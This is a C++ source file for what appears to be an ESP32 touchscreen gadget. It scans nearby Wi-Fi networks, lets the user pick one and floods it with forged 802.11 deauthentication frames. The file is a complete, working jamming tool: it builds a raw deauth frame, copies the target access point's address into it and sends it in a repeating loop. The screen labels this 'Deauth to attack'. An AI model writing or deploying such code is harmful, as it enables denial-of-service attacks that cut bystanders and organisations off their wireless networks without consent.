#include "wifi_deauther.h"
#include "../core/display.h"
#include "../core/touch.h"

bool deauthActive = false;
APInfo apList[32];
int apCount = 0;
int selectedAP = -1;

// 802.11 Deauthentication Frame (26 bytes)
static uint8_t deauthFrame[26] = {
    0xC0, 0x00,             // Frame Control: Deauth
    0x00, 0x00,             // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Destination: Broadcast
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Source BSSID
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID
    0x00, 0x00,             // Sequence
    0x07, 0x00              // Reason: Class 3 frame from non-associated STA
};

void initWiFiDeauther() {
    WiFi.mode(WIFI_MODE_STA);
}

void scanForAPs() {
    tft.fillScreen(C_BG);
    drawHeader("WiFi Scanner");
    tft.setTextColor(C_FG, C_BG);
    tft.setCursor(10, 40);
    tft.print("Scanning...");
    apCount = WiFi.scanNetworks();
    for (int i = 0; i < apCount && i < 32; i++) {
        apList[i].rssi = WiFi.RSSI(i);
        apList[i].channel = WiFi.channel(i);
        strncpy(apList[i].ssid, WiFi.SSID(i).c_str(), 32);
        WiFi.BSSID(i, apList[i].bssid);
        apList[i].selected = false;
    }
    WiFi.scanDelete();
    drawAPList();
}

void drawAPList() {
    tft.fillScreen(C_BG);
    drawHeader("WiFi Deauther");
    int y = 30;
    int h = 22;
    for (int i = 0; i < apCount && i < 10; i++) {
        bool sel = (i == selectedAP);
        uint16_t bg = sel ? C_ACCENT : C_DIM;
        tft.fillRect(4, y, 232, h-2, bg);
        tft.setTextColor(sel ? TFT_WHITE : C_FG, bg);
        tft.setCursor(8, y+5);
        tft.printf("%d. %s", i+1, apList[i].ssid);
        tft.setCursor(180, y+5);
        tft.printf("%ddBm", apList[i].rssi);
        y += h;
    }
    drawButton(10, 260, 100, 30, "DEAUTH", deauthActive);
    drawButton(130, 260, 100, 30, "SCAN", false);
    drawFooter("Touch AP to select | Deauth to attack");
}

void selectAP(int idx) {
    if (idx >= 0 && idx < apCount) {
        selectedAP = idx;
        for (int i=0; i<apCount; i++) apList[i].selected = false;
        apList[idx].selected = true;
        drawAPList();
    }
}

void startDeauth() {
    if (selectedAP < 0) {
        showMsg("Select AP first!", C_WARN);
        return;
    }
    deauthActive = true;
    showMsg("DEAUTH STARTED", C_OK);
    drawAPList();
}

void stopDeauth() {
    deauthActive = false;
    showMsg("DEAUTH STOPPED", C_INFO);
    drawAPList();
}

void runDeauthLoop() {
    if (selectedAP < 0 || selectedAP >= apCount) return;
    esp_wifi_set_channel(apList[selectedAP].channel, WIFI_SECOND_CHAN_NONE);
    for (int i=0; i<6; i++) {
        deauthFrame[4+i] = apList[selectedAP].bssid[i];
        deauthFrame[10+i] = apList[selectedAP].bssid[i];
        deauthFrame[16+i] = apList[selectedAP].bssid[i];
    }
    esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false);
    esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false);
    delay(5);
}
